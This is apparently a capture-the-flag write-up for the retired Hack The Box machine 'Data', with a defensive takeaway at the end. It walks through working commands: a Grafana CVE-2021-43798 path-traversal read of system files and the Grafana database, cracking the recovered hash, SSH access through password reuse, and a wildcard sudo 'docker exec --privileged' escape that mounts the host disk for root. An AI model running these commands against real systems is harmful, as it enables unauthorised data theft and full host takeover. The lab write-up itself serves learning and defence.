# Data — Hack The Box (retired)

**Easy · Linux**

*Flag values redacted; target/VPN addresses generalised.*

**TL;DR:** An unauthenticated path traversal in Grafana 8.0.0 hands over
Grafana's own SQLite database; the password hash inside it cracks in under a
minute and is reused for the user's SSH account; and a `sudo` rule that permits
`docker exec *` lets that user pass `--privileged`, mount the host disk from
inside the container, and become root.

## Reconnaissance

A full TCP sweep returns two ports, which is the most useful thing recon tells
me all engagement:

```
$ nmap -Pn -T4 -p- --min-rate 2000 10.10.11.x
22/tcp   open  ssh   OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
3000/tcp open  http  Grafana
```

Two ports means there is no third option to fall back on: whatever the path is,
it starts in Grafana, because OpenSSH 7.6p1 is not a remote-exploitation story
and never has been. The banner also dates the host — `4ubuntu0.7` is Ubuntu
18.04 — which will matter later only as context, not as a vector.

Port 3000 serving Grafana is worth a version before anything else. Grafana makes
that free:

```
$ curl -s http://10.10.11.x:3000/api/health
{
  "commit": "41f0542c1e",
  "database": "ok",
  "version": "8.0.0"
}
```

No authentication, exact version, exact commit. This is the single observation
the whole engagement turns on, and it took one request. Pinning a version before
reaching for exploits is the difference between searching for "Grafana
vulnerabilities" and searching for one specific advisory.

## Enumeration

Grafana 8.0.0 sits squarely inside the range for **CVE-2021-43798**: versions
8.0.0-beta1 through 8.3.0 fail to normalise the path under
`/public/plugins/<plugin-id>/`, so `..` escapes the plugin directory and the
handler reads anything the process can open. It needs no session.

The one detail worth getting right is on the client side: `curl` will helpfully
collapse `..` in a URL before sending it, which makes a working exploit look
like a patched target. `--path-as-is` stops that.

```
$ curl -s --path-as-is \
    "http://10.10.11.x:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"
root:x:0:0:root:/root:/bin/ash
...
grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin
```

`/bin/ash`, `/sbin/nologin` everywhere, a `guest` account at uid 405 — this is
Alpine/BusyBox, not the Ubuntu the SSH banner advertised. So Grafana is in a
container and my file read is bounded by that container. Confirmed a moment
later by `/etc/hosts`, which shows the container's own id and a Docker bridge
address:

```
172.17.0.2	e6ff5b1cbc85
```

That is worth noting rather than being disappointed by. A container boundary
that limits step one is a boundary something later in the chain will have to
remove — and knowing the container id now saves me looking it up after I get a
shell.

Two files are worth reading immediately. First the config:

```
$ curl -s --path-as-is ".../../etc/grafana/grafana.ini" | grep -vE '^\s*(;|#|$)'
[paths]
[server]
[database]
...
```

Every section header, no directives — the file is completely stock. That is not
a null result: it means the instance is running Grafana's documented default
`secret_key`, so anything in the database encrypted with it is readable by me.

Then the database itself, which the traversal will happily stream in full:

```
$ curl -s --path-as-is ".../../var/lib/grafana/grafana.db" -o grafana.db
$ file grafana.db
SQLite 3.x database, ... 146 pages
```

```
$ sqlite3 grafana.db "select id,login,email,is_admin from user;"
1|admin|admin@localhost|1
2|boris|boris@data.vl|0
```

`data_source`, `api_key`, `user_auth` and `dashboard` are all empty, so the
default `secret_key` buys nothing here — there are no stored datasource secrets
to decrypt. What there is, is two password hashes, and an email address that
tells me the host thinks of itself as `data.vl`.

I also try `/proc/self/environ` — after any file-read primitive on a
containerised app, the process environment is where deployment passwords live
(`GF_SECURITY_ADMIN_PASSWORD` would be sitting right there). It returns empty,
as do `/proc/1/environ` and `/proc/self/cmdline`. Grafana serves files using
their declared size and procfs reports zero, so the response is a valid,
zero-byte read. Worth knowing this fails for a structural reason rather than
concluding the environment is empty.

## Cracking the hash

Grafana stores `PBKDF2-HMAC-SHA256`, 10,000 iterations, 50-byte output, hex
encoded, with a per-user ASCII salt in the adjacent column. Converting that to
something a cracker will load takes one wrinkle: John's
`PBKDF2-HMAC-SHA256` format only accepts a **32-byte** digest, and Grafana's is
50, so John silently refuses the line with `No password hashes loaded`.

Truncating to the first 32 bytes is not a fudge — PBKDF2 generates output one
HMAC block at a time and concatenates, so the first 32 bytes of a 50-byte
derivation are bit-identical to a 32-byte derivation with the same inputs. I
verified that before trusting it, by deriving a known password at several
lengths and confirming each is a prefix of the next:

```
ctl32:$pbkdf2-sha256$10000$TENCaGR0SldqbA$JsGqCEtxv1X3WKSmPtNaSxwpbP6gCoBqycOCHmTomWs
ctl50:$pbkdf2-sha256$10000$TENCaGR0SldqbA$JsGqCEtxv1X3WKSmPtNaSxwpbP6gCoBqycOCHmTomWumESXux6jKmVb5t2bEjTA1SrM
```

and by cracking that control hash with a one-word wordlist first. This costs a
minute and it is the difference between "the password isn't in rockyou" and "my
hash format was wrong" — two conclusions that look identical from the outside.

With the salt base64'd into John's syntax:

```
$ john --format=PBKDF2-HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt grafana32.john
beautiful1       (boris)
1g 0:00:00:46 1.23% (ETA: 17:08:32) 4464p/s
```

Forty-six seconds, 1.2 % of the list. Grafana's 10,000 iterations are a
perfectly reasonable work factor; they are simply irrelevant against a password
this common.

## Foothold

The obvious next move is the Grafana web login, but the more valuable test is
the one that assumes reuse. `boris` is a Grafana account *and* an email address
at the host's own domain, which is exactly the shape of an account that also
exists on the box:

```
$ sshpass -p 'beautiful1' ssh boris@10.10.11.x
boris@data:~$ id
uid=1001(boris) gid=1001(boris) groups=1001(boris)
boris@data:~$ cat user.txt
<redacted>
```

An application password opening a system account is the single most productive
assumption in this hobby, and it costs one command to test.

## Privilege escalation

`boris` is in no interesting groups — notably *not* `docker`, which is the first
thing I check on a host that is visibly running containers. But `sudo -l` is
where the box is:

```
boris@data:~$ sudo -n -l
User boris may run the following commands on localhost:
    (root) NOPASSWD: /snap/bin/docker exec *
```

Read that as a policy author would have intended it: "boris may run commands
inside the container". Now read it as `sudo` actually implements it: the
trailing `*` matches every remaining argument, and the arguments to `docker
exec` include **Docker's own flags**, not just the command to run. I choose how
the container is entered, and `docker exec` takes `--privileged`.

```
boris@data:~$ sudo /snap/bin/docker exec --privileged -u 0 e6ff5b1cbc85 sh -c \
    'id; grep CapEff /proc/self/status; ls -l /dev/sda1'
uid=0(root) gid=0(root) groups=0(root),...,6(disk),...
CapEff:	0000003fffffffff
brw-rw----    1 root     disk        8,   1 /dev/sda1
```

`CapEff: 0000003fffffffff` is every capability including `CAP_SYS_ADMIN`, and
the host's block devices are visible in the container's `/dev`. That pair is
host root; the only remaining step is spelling it out. `mount` needs
`CAP_SYS_ADMIN`, which I now have:

```
# mkdir -p /mnt/hostfs && mount /dev/sda1 /mnt/hostfs
# cat /mnt/hostfs/root/root.txt
<redacted>
```

and for an interactive shell rather than a file read, `chroot` into it:

```
# chroot /mnt/hostfs /bin/bash
root@e6ff5b1cbc85:/# id
uid=0(root) gid=0(root) groups=0(root),...,27(sudo)
```

Note what happened to the container boundary that limited the file read in step
one: it is not bypassed, it is simply not applied. `--privileged` is a supported
Docker feature doing exactly what it is documented to do. The vulnerability is
the wildcard in the sudoers line, not anything in Docker.

Cleanup afterwards is one command and worth doing properly — `umount
/mnt/hostfs && rmdir /mnt/hostfs`, then verifying with `mount | grep -c hostfs`
rather than assuming.

## What did not work

- **`/proc/self/environ` through the traversal.** On a containerised app this is
  usually the fastest route to a deployment password, but Grafana serves files
  by their declared size and procfs files report size 0, so every `/proc` read
  comes back empty. Structural, not a permissions problem — don't keep retrying
  it with different paths.
- **The default `secret_key`.** Confirming `grafana.ini` was stock felt like a
  win, and on an instance with datasources it would have been: default key plus
  a stolen database means every stored backend credential decrypts. Here the
  `data_source` table was empty, so it bought nothing. Worth the sixty seconds;
  worth also noticing quickly that there is nothing to spend it on.
- **Default Grafana credentials** (`admin:admin` and variants against
  `POST /login`) — all 401. Cheap to test, and cheaper than cracking the `admin`
  hash, which I never bothered to finish because `boris` was enough.
- **`/etc/shadow` via the traversal.** Grafana runs as uid 472 inside the
  container, so the container's own shadow file is unreadable — and it would
  have been the *container's*, not the host's, which is the more important point.

## Lessons

Ask a web application for its version before you ask it for anything else;
`/api/health`, `/version` and their equivalents are usually unauthenticated, and
a pinned version turns exploit selection from a search into a lookup. When a
cracker refuses a hash, prove your encoding with a self-made control hash before
you conclude the password is strong — "hash format wrong" and "password not in
wordlist" produce identical silence. And treat a `sudo` rule ending in `*` as
equivalent to granting the binary's entire flag surface: with `docker`,
`tar`, `rsync`, `find` or anything that can spawn, mount or write, the flags are
the exploit, and the rule that "only lets them run one command" usually does not.

## Defensive takeaway

The fix that matters most is the least dramatic one: drop the wildcard from the
sudoers rule. Patching Grafana closes today's door, but the password is still
weak and still reused, so the next disclosure — another CVE, a backup, a phish —
puts an attacker back in `boris`'s shell with the wildcard still waiting. Fix
the rule and every one of those futures ends at an unprivileged account instead
of at host root. The CVE decided how the attacker got *in*; a locally widened
privilege boundary decided that it cost the whole machine.
